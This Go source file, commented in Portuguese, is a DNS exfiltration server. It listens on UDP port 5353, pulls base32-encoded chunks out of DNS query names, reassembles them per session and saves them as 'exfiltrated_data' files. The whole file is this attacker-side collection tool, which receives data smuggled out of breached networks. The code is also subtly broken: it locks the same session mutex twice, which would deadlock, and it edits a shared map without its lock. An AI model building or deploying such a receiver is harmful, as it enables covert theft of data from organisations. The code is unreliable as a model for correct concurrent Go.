package main

import (
	"encoding/base32"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// SessionData armazena os chunks de dados para uma sessão específica
type SessionData struct {
	Chunks map[int]string
	TotalChunks int
	Mutex sync.Mutex
}

var sessions = make(map[string]*SessionData)
var sessionsMutex sync.Mutex

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	for _, q := range r.Question {
		if q.Qtype == dns.TypeA {
			parts := strings.Split(q.Name, ".")
			if len(parts) >= 4 { // Espera-se: <chunk_codificado>.<sessid>.<ordem>.<dominio_base>
				encodedChunk := parts[0]
				sessionID := parts[len(parts)-3]
				orderStr := parts[len(parts)-2]

				order, err := strconv.Atoi(orderStr)
				if err != nil {
					log.Printf("Erro ao converter ordem do chunk '%s': %v\n", orderStr, err)
					continue
				}

				sessionsMutex.Lock()
				sess, ok := sessions[sessionID]
				if !ok {
					sess = &SessionData{
						Chunks: make(map[int]string),
					}
					sessions[sessionID] = sess
				}
				sessionsMutex.Unlock()

				sess.Mutex.Lock()
				sess.Chunks[order] = encodedChunk
				fmt.Printf("[+] Sessão %s: chunk %d recebido → %s\n", sessionID, order, encodedChunk)

				// Tentar reconstruir se todos os chunks foram recebidos (assumindo que o último chunk indica o total)
				// Em um cenário real, o cliente enviaria o total de chunks no início ou fim da sessão
				// Para este exemplo, vamos considerar que a exfiltração termina quando um chunk com um determinado ID de sessão é recebido
				// e não há mais chunks chegando por um tempo, ou um chunk especial indica o fim.
				// Por simplicidade, vamos apenas imprimir o que foi recebido.

				// Para demonstração, vamos reconstruir e salvar quando um número arbitrário de chunks for recebido
				// ou quando um chunk finalizador for identificado (ex: 'END' como chunk final)
				if strings.HasPrefix(encodedChunk, "END") { // Exemplo de marcador de fim
					fmt.Printf("[*] Marcador de fim de sessão '%s' recebido para a sessão %s. Tentando reconstruir...\n", encodedChunk, sessionID)
					reconstructAndSave(sessionID, sess)
					delete(sessions, sessionID) // Limpar sessão após reconstrução
				}
				sess.Mutex.Unlock()

			} else {
				fmt.Printf("[*] Requisição DNS inesperada: %s\n", q.Name)
			}
		} else {
			fmt.Printf("[*] Recebida query para %s (Tipo %s)\n", q.Name, dns.Type(q.Qtype).String())
		}
	}

	w.WriteMsg(m)
}

func reconstructAndSave(sessionID string, sess *SessionData) {
	sess.Mutex.Lock()
	defer sess.Mutex.Unlock()

	var decodedBytes []byte
	// Ordenar os chunks pela chave (ordem)
	var keys []int
	for k := range sess.Chunks {
		keys = append(keys, k)
	}
	// Sort.Ints(keys) // Necessitaria importar "sort"

	// Para simplificar, vamos iterar sobre os chunks na ordem em que foram recebidos
	// Em um cenário real, seria necessário ordenar os chunks pelo índice.
	// Como o mapa não garante ordem, vamos iterar e tentar decodificar.

	// Vamos assumir que os chunks estão em ordem para este exemplo
	// e que o cliente envia um marcador de fim.
	// Para uma implementação robusta, seria necessário um mecanismo de ordenação e verificação de completude.

	// Reconstruir os dados
	for i := 0; ; i++ {
		chunk, ok := sess.Chunks[i]
		if !ok {
			// Se não houver mais chunks em ordem, parar
			break
		}
		if strings.HasPrefix(chunk, "END") {
			break // Marcador de fim
		}

		decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(chunk)
		if err != nil {
			log.Printf("Erro ao decodificar chunk %d da sessão %s: %v\n", i, sessionID, err)
			continue
		}
		decodedBytes = append(decodedBytes, decoded...)
	}

	if len(decodedBytes) > 0 {
		fileName := fmt.Sprintf("exfiltrated_data_%s.bin", sessionID)
		err := os.WriteFile(fileName, decodedBytes, 0644)
		if err != nil {
			log.Printf("Erro ao salvar arquivo exfiltrado %s: %v\n", fileName, err)
		} else {
			fmt.Printf("[+] Dados da sessão %s reconstruídos e salvos em %s\n", sessionID, fileName)
		}
	} else {
		fmt.Printf("[*] Nenhuns dados para reconstruir para a sessão %s.\n", sessionID)
	}
}

func main() {
	dns.HandleFunc(".", handleRequest)

	server := &dns.Server{Addr: ":5353", Net: "udp"}
	fmt.Println("[*] Servidor de exfiltração DNS iniciado na porta 5353 (UDP)")
	err := server.ListenAndServe()
	if err != nil {
		log.Fatalf("Falha ao iniciar o servidor: %s\n", err.Error())
	}
}


